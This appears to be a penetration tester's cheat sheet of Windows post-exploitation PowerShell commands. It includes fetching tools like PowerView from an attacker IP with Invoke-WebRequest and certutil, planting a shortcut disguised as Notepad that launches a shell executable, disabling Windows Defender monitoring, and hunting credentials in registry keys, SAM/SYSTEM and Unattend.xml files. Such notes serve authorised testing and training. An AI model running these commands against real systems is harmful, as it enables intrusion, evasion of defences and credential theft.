Download Files
```Powershell
Invoke-WebRequest -Uri http://10.10.14.176:8000/PowerView.ps1 -OutFile PowerView.ps1

curl -o example.txt http://example.com/file.txt

certutil.exe -urlcache -split -f http://<ip>/file file_save
```

Get Processes
```powershell
Get-Process | Format-Table -Property Name, Id, CPU, WorkingSet -AutoSize

Get-Process -Name "notepad"
```

List Network Connections
```powershell
netstat -aon

arp -a
```

Connect to a machine with admin perms
```
Enter-PSSession -Computername <computername>
```

Shortcuts
```Powershell
$targetPath = "C:\xampp\htdocs\5shell.exe"
$shortcutPath = "C:\Common Applications\Notepad.lnk"
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut($shortcutPath)
$shortcut.TargetPath = $targetPath
$shortcut.Save()
```
### Who Am I?
```powershell
whoami
echo %username%

# Check Groups
whoami /groups

# Check Privileges
whoami /priv

whoami /all
```

### Where Am I?
```powershell
hostname
echo %hostname%
```
### Anyone home?
Local users
```powershell
net users
```

Domain users
```powershell
net users /domain
```
### What am I part of?
Local groups
```powershell
net groups
```

Domain groups
```powershell
net groups /domain
```
### What is this place?
```text
systeminfo
```
### Is it fancy?
Both should be the same for ease of exploitation, if either is 32-bit then try to gain a 64-bit shell.  
Use PowerShell
```powershell
[environment]::Is64BitOperatingSystem
[environment]::Is64BitProcess
```
### Am I tied up?
Check LanguageMode. FullLanguage is nicer to have.  
```powershell
$ExecutionContext.SessionState.LanguageMode
```
### Anything reachable?
```powershell
Get-AppLockerPolicy -Effective
Get-AppLockerPolicy -Effective | select -ExpandedProperty RuleCollections
```
### What does the inside look like?
Look for interesting services
```powershell
netstat -aon
```
### Leave me alone
Do you have admin privs?  

Disable Windows Defender real time monitoring
```powershell
Set-MpPreference -DisableRealTimeMonitoring $true	
```

Disable Windows Defender scanning for all files downloaded
```powershell
Set-MpPreference -DisableIOAVProtection $true	
```

### Sniff for Credentials
Common creds location, always in plaintext
```powershell
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogin"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

Look for interesting files that may contain creds
```powershell
dir /s SAM
dir /s SYSTEM
dir /s Unattend.xml
```

### Look Around
```powershell
#Starting, Restarting and Stopping services in Powershell
Start-Service <service>
Stop-Service <service>
Restart-Service <service>

#Powershell History
Get-History
(Get-PSReadlineOption).HistorySavePath #displays the path of consoleHost_history.txt
type C:\Users\sathvik\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

#Viewing installed execuatbles
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

#Process Information
Get-Process
Get-Process | Select ProcessName,Path

#Sensitive info in XAMPP Directory
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue #this for a specific user

#Service Information
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```